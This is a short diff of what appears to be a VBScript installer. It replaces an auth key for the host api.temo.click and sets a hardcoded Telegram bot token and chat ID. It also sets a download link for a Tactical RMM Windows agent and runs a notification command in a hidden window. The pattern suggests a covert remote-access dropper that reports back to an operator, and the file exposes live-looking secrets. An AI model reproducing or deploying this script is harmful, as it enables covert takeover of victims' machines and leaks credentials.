@@ -5,7 +5,7 @@ BOT_TOKEN    = "8643735125:AAHi9ESDyzDDu9veWr7mM7GCIPaYwxxOpTo"
 CHAT_ID      = "8345342738"
 
 api          = "https://api.temo.click"
-auth         = "401e7b6b2b31961a40c0e2089cedd79a42f3d0995db76d52ba5492aefda79fd4"
+auth         = "fd3f318ba42ff9535a0c986e7ec0cdfa9fb18a93711e2ce4e8c800dfa19c5498"
 clientid     = "1"
 siteid       = "1"
 downloadlink = "https://github.com/amidaware/rmmagent/releases/download/v2.10.0/tacticalagent-v2.10.0-windows-amd64.exe"
@@ -49,6 +49,7 @@ notifyCmd = _
 
 ' Send Notification
 objShell.Run notifyCmd, 0, False
+
 
 
 
